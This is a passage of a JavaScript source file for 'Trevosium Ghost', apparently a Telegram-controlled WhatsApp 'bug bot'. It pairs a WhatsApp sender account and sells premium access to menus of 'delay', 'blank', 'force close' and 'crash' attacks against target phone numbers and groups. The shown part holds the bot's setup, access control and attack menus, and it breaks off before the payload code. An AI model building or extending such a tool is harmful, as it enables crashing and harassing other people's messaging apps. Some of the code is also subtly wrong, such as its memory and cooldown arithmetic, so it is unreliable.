    .filter(v => {
      const sec = typeof v.seconds === "number"
        ? v.seconds
        : parseSecs(v.timestamp || v.duration?.timestamp || v.duration);
      return !v.live && sec > 0 && sec <= 1200;
    })
    .slice(0, 5)
    .map(v => ({
      url: v.url,
      title: v.title
    }));
};

function normalizeYouTubeUrl(raw) {
  if (!raw || typeof raw !== "string") return "";
  let u = raw.trim();

  const shorts = u.match(/shorts\/([A-Za-z0-9_-]+)/i);
  if (shorts) return `https://www.youtube.com/watch?v=${shorts[1]}`;

  const short = u.match(/youtu\.be\/([A-Za-z0-9_-]+)/i);
  if (short) return `https://www.youtube.com/watch?v=${short[1]}`;

  const watch = u.match(/v=([A-Za-z0-9_-]+)/i);
  if (watch) return `https://www.youtube.com/watch?v=${watch[1]}`;

  return u;
}

async function downloadToTemp(url, ext = ".mp3") {
  const file = path.join(os.tmpdir(), `music_${Date.now()}${ext}`);
  const res = await axios.get(url, {
    responseType: "stream",
    timeout: 180000
  });

  await new Promise((resolve, reject) => {
    const w = fs.createWriteStream(file);
    res.data.pipe(w);
    w.on("finish", resolve);
    w.on("error", reject);
  });

  return file;
}

function cleanup(f) {
  try { fs.unlinkSync(f); } catch {}
}

function escapeHtml(text = "") {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function pickRandom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function parallelRequests(tasks, batchSize = 10, delay = 800) {
  return new Promise(async (resolve) => {
    let success = 0;
    let failed = 0;

    for (let i = 0; i < tasks.length; i += batchSize) {
      const batch = tasks.slice(i, i + batchSize);

      const results = await Promise.allSettled(
        batch.map(fn => fn())
      );

      for (const r of results) {
        if (r.status === "fulfilled" && r.value === true) {
          success++;
        } else {
          failed++;
        }
      }

      if (i + batchSize < tasks.length) {
        await sleep(delay);
      }
    }

    resolve({ success, failed });
  });
}

function progressBar(percent) {
  const total = 10
  const filled = Math.floor(percent / 10)
  const empty = total - filled
  return "▰".repeat(filled) + "▱".repeat(empty) + ` ${percent}%`
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const adminFile = path.join(__dirname, "admin.json");

// Baca admin.json
function loadAdmins() {
    if (!fs.existsSync(adminFile)) {
        fs.writeFileSync(adminFile, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(adminFile));
}

// Simpan admin.json
function saveAdmins(admins) {
    fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
}

// Tambah Admin
function addAdminUser(userId) {
    let admins = loadAdmins();
    if (admins.includes(userId)) return false;
    admins.push(userId);
    saveAdmins(admins);
    return true;
}

// Hapus Admin
function delAdminUser(userId) {
    let admins = loadAdmins();
    if (!admins.includes(userId)) return false;
    admins = admins.filter(id => id !== userId);
    saveAdmins(admins);
    return true;
}

// Cek Admin
function isAdmin(userId) {
    let admins = loadAdmins();
    return admins.includes(userId);
}

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
═══════════
═════════════════════
☇ Botname: Trevosium Ghost 
☇ Version: 24.0
☇ Status: Bot Connected
═════════════════════
═══════════
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘———————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
═══════════
═════════════════════
☇ Botname: Trevosium Ghost 
☇ Version: 24.0
☇ Status: Bot Connected
═════════════════════
═══════════
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "XAVIENZZ");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<pre>⬡═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═———————————————————═⬡</pre>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl2, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═—⊱ ⎧ TREVOSIUM GHOST GHOST ⎭ ⊰―═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═—————————————————═⬡</pre></blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

// Command addadmin
bot.command("addadmin", async (ctx) => {

  // Hanya owner yang bisa pakai command ini
    if (ctx.from.id != ownerID && !isOwner(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau owner utama");
    }

  // Ambil argumen dari pesan
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
  }

  const userId = args[1];
  const success = addAdminUser(userId);

  // Respon hasil
  if (success) {
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai Admin`);
  } else {
    ctx.reply(`⚠️ ☇ ${userId} sudah jadi Admin sebelumnya`);
  }
});

// Command deladmin
bot.command("deladmin", async (ctx) => {

    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner");
    }
    

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }

    const userId = args[1];
    const success = delAdminUser(userId);

    if (success) {
        ctx.reply(`✅ ☇ ${userId} berhasil dicabut dari Admin`);
    } else {
        ctx.reply(`⚠️ ☇ ${userId} bukan Admin`);
    }
});

bot.command('addprem', async (ctx) => {    
    const senderId = ctx.from.id.toString()

    // baca admin.json
    let adminList = []
    try {
        adminList = JSON.parse(fs.readFileSync('./admin.json'))
    } catch (e) {
        adminList = []
    }

    // hanya ownerID atau yang ada di admin.json
    if (senderId != ownerID.toString() && !adminList.includes(senderId)) {    
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");    
    }    

    const args = ctx.message.text.split(" ");    
    if (args.length < 3) {    
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30");    
    }    

    const userId = args[1];    
    const duration = parseInt(args[2]);    

    if (isNaN(duration)) {    
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");    
    }    

    const expiryDate = addpremUser(userId, duration);    

    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);    
});

bot.command('delprem', async (ctx) => {
    const senderId = ctx.from.id.toString()

    // baca admin.json
    let adminList = []
    try {
        adminList = JSON.parse(fs.readFileSync('./admin.json'))
    } catch (e) {
        adminList = []
    }

    // hanya owner atau admin di admin.json
    if (senderId != ownerID.toString() && !adminList.includes(senderId)) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }

    const userId = args[1];

    removePremiumUser(userId);

    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

// ====== FILE CONFIG ======
const GROUP_FILE = "グループのみ.json";

// Load status dari file (jika ada)
let GROUP_ONLY = false;

if (fs.existsSync(GROUP_FILE)) {
  try {
    const data = JSON.parse(fs.readFileSync(GROUP_FILE));
    GROUP_ONLY = data.groupOnly || false;
  } catch (err) {
    console.error("Error membaca file グループのみ.json:", err);
  }
}

// Function save ke file
function saveGroupOnlyStatus() {
  fs.writeFileSync(
    GROUP_FILE,
    JSON.stringify({ groupOnly: GROUP_ONLY }, null, 2)
  );
}


// ====== COMMAND ======
bot.command("grouponly", async (ctx) => {
  try {

    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Perintah ini hanya untuk Owner!");
    }

    // Ambil argumen setelah command
    const args = ctx.message.text.split(" ").slice(1);
    const mode = (args[0] || "").toLowerCase();

    if (!["on", "off"].includes(mode)) {
      return await ctx.reply(
        "⚠️ Format salah!\nGunakan:\n/grouponly on\n/grouponly off"
      );
    }

    GROUP_ONLY = mode === "on";

    // Simpan ke file
    if (typeof saveGroupOnlyStatus === "function") {
      saveGroupOnlyStatus();
    }

    const statusText = GROUP_ONLY
      ? "🟢 ON (Group Only)"
      : "🔴 OFF (Private Allowed)";

    await ctx.replyWithHTML(
`⚙️ <b>GROUP ONLY MODE</b>

Status: <b>${statusText}</b>`
    );

  } catch (err) {
    console.error("Error grouponly:", err);
    await ctx.reply("❌ Terjadi kesalahan saat menjalankan perintah.");
  }
});

bot.start(async (ctx) => {  
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";  
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";  
    const runtimeStatus = formatRuntime();  
    const memoryStatus = formatMemory();  
    const cooldownStatus = loadCooldown();  
    const senderId = ctx.from.id;  
    const userTag = ctx.from.username ? "@" + ctx.from.username : ctx.from.first_name;  
    

    if (!checkGroupOnly(ctx)) return;

    const menuMessage = `  
(⸙) ɦเ เɱ ƚɾҽʋσʂιυɱ ɠԋσʂƚ
<blockquote>Olaa ${userTag} Сара WhatsApp Баг Бот соуп, Телеграммала иаԥҵоу, ҟәыӷарыла шәхы иашәырхәа</blockquote>
ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴛʀᴇᴠᴏꜱɪᴜᴍ ɢʜᴏꜱᴛ. 
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴꜰᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴅᴀʀɪ ᴋᴀᴍɪ⎙
<blockquote>⬡═―⊱ ⎧ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⎭ ⊰—═⬡</blockquote>
◉ ᴀᴜᴛʜᴏʀ : @XavienZzTamvan
◉ ᴠᴇʀꜱɪᴏɴ : 24.0
◉ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀꜱᴄʀɪᴘᴛ
<blockquote>⬡═―⊱ ⎧ 𝚂𝚃𝙰𝚃𝚄𝚂 𝙱𝙾𝚃 ⎭ ⊰—═⬡</blockquote>
◉ ʀᴜɴᴛɪᴍᴇ : ${runtimeStatus}
◉ ᴀᴄᴄᴇꜱꜱ : ${premiumStatus}  
◉ ꜱᴛᴀᴛᴜꜱ ꜱᴇɴᴅᴇʀ : ${senderStatus} 
◉ ᴜꜱᴇʀ-ɪᴅ : ${senderId}
<blockquote>ⓘ 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠</blockquote> 
`;  

    const keyboard = [
    [
       {
            text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ",
            callback_data: "/backpanel"
        },
        {
            text: "⌜ Dҽʋҽʅσρҽɾ ⌟",
            url: "https://t.me/XavienZzTamvan"
        },
        {
            text: "ᖫ ɴᴇxᴛ ⟹ ᖭ",
            callback_data: "/controls"
        }
    ]
];

  ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});  

bot.action('/start', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderId = ctx.from.id;
    const userTag = ctx.from.username ? "@" + ctx.from.username : ctx.from.first_name;
    
  if (!checkGroupOnly(ctx)) return;
  
    const menuMessage = `
(⸙) ɦเ เɱ ƚɾҽʋσʂιυɱ ɠԋσʂƚ
<blockquote>Olaa ${userTag} Сара WhatsApp Баг Бот соуп, Телеграммала иаԥҵоу, ҟәыӷарыла шәхы иашәырхәа</blockquote>
ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴛʀᴇᴠᴏꜱɪᴜᴍ ɢʜᴏꜱᴛ. 
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴꜰᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴅᴀʀɪ ᴋᴀᴍɪ⎙
<blockquote>⬡═―⊱ ⎧ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⎭ ⊰—═⬡</blockquote>
◉ ᴀᴜᴛʜᴏʀ : @XavienZzTamvan
◉ ᴠᴇʀꜱɪᴏɴ : 24.0
◉ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀꜱᴄʀɪᴘᴛ
<blockquote>⬡═―⊱ ⎧ 𝚂𝚃𝙰𝚃𝚄𝚂 𝙱𝙾𝚃 ⎭ ⊰—═⬡</blockquote>
◉ ʀᴜɴᴛɪᴍᴇ : ${runtimeStatus}
◉ ᴀᴄᴄᴇꜱꜱ : ${premiumStatus}  
◉ ꜱᴛᴀᴛᴜꜱ ꜱᴇɴᴅᴇʀ : ${senderStatus} 
◉ ᴜꜱᴇʀ-ɪᴅ : ${senderId}
<blockquote>ⓘ 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠</blockquote> 
`;

    const keyboard = [
    [
       {
            text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ",
            callback_data: "/backpanel"
        },
        {
            text: "⌜ Dҽʋҽʅσρҽɾ ⌟",
            url: "https://t.me/XavienZzTamvan"
        },
        {
            text: "ᖫ ɴᴇxᴛ ⟹ ᖭ",
            callback_data: "/controls"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
        }
    }
});

bot.action("/backpanel", async (ctx) => {
    try {
        await ctx.answerCbQuery("🔄 Panel sedang direstart...\nSession akan terhapus..", {
            show_alert: false
        });

        const sessionPath = path.join(__dirname, "session");

        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, { recursive: true, force: true });
        }

        setTimeout(() => {
            process.exit(1);
        }, 1500);

    } catch (err) {
        console.error("Error restart panel:", err);
        await ctx.answerCbQuery("❌ Gagal restart panel.", {
            show_alert: true
        });
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>⬡═━━【CONTROL MENU】━━═⬡</pre></blockquote>
⌬ /addprem - Id ☇ Days
╰⊱ |[ Menambah Akses Premium ]|
⌬ /delprem - Id
╰⊱ |[ Menghapus Akses Premium ]|
⌬ /addadmin - Id
╰⊱ |[ Menambah Akses Admin ]|
⌬ /deladmin - Id
╰⊱ |[ Menghapus Akses Admin ]|
⌬ /grouponly - On|Off
╰⊱ |[ Control Group Only ]|
⌬ /addbot - 62xx
╰⊱ |[ Pairing WhatsApp ]|
⌬ /setcd - 5m
╰⊱ |[ Mengatur Cooldown ]|
⌬ /killsesi
╰⊱ |[ Reset Session ]|
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [ 
    { text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ", callback_data: "/start" },
    { text: "ᖫ ɴᴇxᴛ ⟹ ᖭ", callback_data: "/bug" }
  ]
];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
<blockquote>┏━━━〔 ❅ SYSTEM CHOICE ❅ 〕━━━┓
┃༗ Please Select the Bug Button Menu
┃༗ According to your needs
┗━━━━━━━━━━━━━━━━━━━━━━━┛</blockquote>
`;

    const keyboard = [
        [
            { text: "𝙳𝙴𝙻𝙰𝚈 𝙼𝙴𝙽𝚄", callback_data: "/delayinvis" },
            { text: "𝙱𝙻𝙰𝙽𝙺 𝙼𝙴𝙽𝚄", callback_data: "/blank" }
        ],
        [
            { text: "𝙵𝙾𝚁𝙲𝙻𝙾𝚂𝙴 𝙼𝙴𝙽𝚄", callback_data: "/forclose" },
            { text: "𝙲𝚁𝙰𝚂𝙷 𝙼𝙴𝙽𝚄", callback_data: "/crash" }
        ],
        [
            { text: "𝚃𝚁𝙰𝚅𝙰𝚂 𝙶𝚁𝙾𝚄𝙿", callback_data: "/group" }
        ],
        [
            { text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ", callback_data: "/controls" },
            { text: "ᖫ ɴᴇxᴛ ⟹ ᖭ", callback_data: "/tools" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/delayinvis', async (ctx) => {
    const bugMenu = `
<blockquote><pre>⬡═━━【DELAY OPTIONS】━━═⬡</pre></blockquote>
⌬ /lightdelay ✆ 628xx 
╰⊱ [ Delay Can Spam ]
⌬ /delayhard ✆ 628xx 
╰⊱ |[ Delay Invisible Hard ]|
⌬ /voxtrash ✆ 628xx 
╰⊱ |[ Delay Blank Chat ]|
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [
